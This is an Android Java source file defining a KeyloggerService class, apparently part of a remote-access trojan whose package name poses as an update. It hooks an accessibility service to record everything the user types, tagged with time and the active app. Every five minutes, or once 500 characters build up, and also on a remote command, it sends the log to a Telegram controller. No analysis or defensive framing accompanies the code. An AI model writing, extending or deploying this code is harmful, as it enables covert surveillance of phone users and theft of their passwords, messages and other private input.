package com.kasari.update;

import android.view.accessibility.AccessibilityEvent;
import java.text.SimpleDateFormat;
import java.util.*;

/**
 * Processes accessibility events to capture text input.
 * Called from ScreenMirror.onAccessibilityEvent().
 * No separate registration needed — piggybacks on ScreenMirror's AccessibilityService.
 */
public class KeyloggerService {

    private static final int MAX_LOG = 500;
    private static final StringBuilder mLog = new StringBuilder();
    private static String mLastApp = "";
    private static long mLastSend = 0;

    public static void onEvent(AccessibilityEvent event) {
        if (event == null) return;
        int type = event.getEventType();

        // Track active app window
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence pkg = event.getPackageName();
            if (pkg != null && !pkg.toString().equals(mLastApp)) {
                mLastApp = pkg.toString();
            }
            return;
        }

        // Capture text input
        if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> texts = event.getText();
            if (texts != null && !texts.isEmpty()) {
                String text = texts.get(0).toString().trim();
                if (!text.isEmpty()) {
                    String ts = new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                        .format(new Date());
                    mLog.append("[").append(ts).append("] [").append(mLastApp)
                        .append("] ").append(text).append("\n");
                }
            }
        }

        // Auto-send if buffer full or every 5 minutes
        long now = System.currentTimeMillis();
        boolean full = mLog.length() >= MAX_LOG;
        boolean timePassed = (now - mLastSend) > 5 * 60 * 1000L;
        if ((full || timePassed) && mLog.length() > 0) {
            flush();
        }
    }

    private static synchronized void flush() {
        if (mLog.length() == 0) return;
        String log = mLog.toString();
        mLog.setLength(0);
        mLastSend = System.currentTimeMillis();
        new Thread(() -> TelegramController.sendMessage(
            "⌨️ Keylog:\n" + log)).start();
    }

    // Called by /notifications command in CommandProcessor
    public static void sendBuffer() {
        flush();
    }
}
